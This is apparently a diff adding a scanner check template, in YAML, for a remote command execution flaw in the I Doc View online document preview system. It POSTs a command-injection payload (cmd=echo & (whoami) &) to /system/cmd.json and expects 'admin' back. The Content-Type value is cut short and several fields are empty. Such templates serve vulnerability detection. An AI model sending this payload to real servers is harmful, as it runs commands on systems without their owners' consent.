@@ -1,0 +1,22 @@
+id:
+info:
+  name: I Doc View在线文档预览系统 cmd.json RCE漏洞
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /system/cmd.json
+  headers:
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: application/x-www-form-urlencod
+  data: |
+    cmd=echo+%26+%28whoami%29+%26
+response1:
+  headers:
+  body: admin
+  code:
+requests2:
+response2:
